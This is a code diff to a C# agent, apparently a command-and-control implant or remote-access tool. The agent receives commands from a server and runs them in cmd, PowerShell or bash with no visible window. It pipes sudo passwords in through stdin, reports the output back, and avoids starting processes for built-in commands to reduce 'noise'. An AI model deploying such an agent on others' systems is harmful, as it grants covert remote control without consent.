@@ -50,11 +50,12 @@ class Agent
                     string command = task.GetProperty("command").GetString() ?? "";
                     string stdin   = task.TryGetProperty("stdin", out var stdinProp)
                                      ? stdinProp.GetString() ?? "" : "";
+                    string shell   = task.TryGetProperty("shell", out var shellProp)
+                                     ? shellProp.GetString() ?? "auto" : "auto";
 
-                    Console.WriteLine($"[>] Executando: {command}");
+                    Console.WriteLine($"[>] Executando [{shell}]: {command}");
 
-                    // Processa o comando e obtém o resultado
-                    string output = HandleCommand(command, stdin);
+                    string output = HandleCommand(command, stdin, shell);
 
                     await SendResult(taskId, output);
                     Console.WriteLine($"[+] Resultado enviado para tarefa {taskId}");
@@ -74,7 +75,7 @@ class Agent
 
     // Comandos internos (cd, pwd) são resolvidos pelo próprio agente sem criar
     // nenhum processo, reduzindo ruído no sistema.
-    static string HandleCommand(string command, string stdin = "")
+    static string HandleCommand(string command, string stdin = "", string shell = "auto")
     {
         string trimmed = command.Trim();
 
@@ -83,14 +84,12 @@ class Agent
             return BuiltinCd(trimmed);
         }
 
-        // PWD: retorna o diretório atual sem criar processo
         if (trimmed == "pwd")
         {
             return currentDir;
         }
 
-        // Qualquer outro comando vai pro shell, usando currentDir como WorkingDirectory
-        return ExecuteCommand(trimmed, stdin);
+        return ExecuteCommand(trimmed, stdin, shell);
     }
 
     static string BuiltinCd(string command)
@@ -128,15 +127,13 @@ class Agent
     // Executa um comando no shell do sistema.
     // Sempre usa currentDir como WorkingDirectory, garantindo que
     // o comando roda no diretório certo mesmo sendo um processo novo.
-    static string ExecuteCommand(string command, string stdin = "")
+    static string ExecuteCommand(string command, string stdin = "", string shell = "auto")
     {
         try
         {
             bool isWindows = System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                 System.Runtime.InteropServices.OSPlatform.Windows);
 
-            // Se tem stdin e é comando sudo, injeta flag -S
-            // para que o sudo leia a senha do stdin ao invés do terminal
             string finalCommand = command;
             if (!string.IsNullOrEmpty(stdin) && command.StartsWith("sudo"))
             {
@@ -145,23 +142,38 @@ class Agent
             }
 
             var proc = new Process();
-            proc.StartInfo.FileName  = isWindows ? "cmd.exe" : "/bin/bash";
-            proc.StartInfo.Arguments = isWindows
-                ? $"/c {finalCommand}"
-                : $"-c \"{finalCommand}\"";
+
+            switch (shell)
+            {
+                case "cmd":
+                    proc.StartInfo.FileName  = "cmd.exe";
+                    proc.StartInfo.Arguments = $"/c {finalCommand}";
+                    break;
+                case "powershell":
+                    proc.StartInfo.FileName  = "powershell.exe";
+                    proc.StartInfo.Arguments = $"-NoProfile -NonInteractive -Command \"{finalCommand}\"";
+                    break;
+                case "bash":
+                    proc.StartInfo.FileName  = "/bin/bash";
+                    proc.StartInfo.Arguments = $"-c \"{finalCommand}\"";
+                    break;
+                default:
+                    proc.StartInfo.FileName  = isWindows ? "cmd.exe" : "/bin/bash";
+                    proc.StartInfo.Arguments = isWindows
+                        ? $"/c {finalCommand}"
+                        : $"-c \"{finalCommand}\"";
+                    break;
+            }
 
             proc.StartInfo.RedirectStandardOutput = true;
             proc.StartInfo.RedirectStandardError  = true;
             proc.StartInfo.RedirectStandardInput  = !string.IsNullOrEmpty(stdin);
             proc.StartInfo.UseShellExecute        = false;
             proc.StartInfo.CreateNoWindow         = true;
-
-            // O diretório de trabalho sempre é o currentDir do agente
-            proc.StartInfo.WorkingDirectory = currentDir;
+            proc.StartInfo.WorkingDirectory        = currentDir;
 
             proc.Start();
 
-            // Escreve no stdin do processo (ex: senha do sudo)
             if (!string.IsNullOrEmpty(stdin))
             {
                 proc.StandardInput.WriteLine(stdin);
@@ -171,8 +183,6 @@ class Agent
             string output = proc.StandardOutput.ReadToEnd()
                           + proc.StandardError.ReadToEnd();
 
-            // Timeout: se o comando travar (ex: comando interativo),
-            // mata o processo e retorna o que já foi capturado
             if (!proc.WaitForExit(CMD_TIMEOUT_MS))
             {
                 proc.Kill();
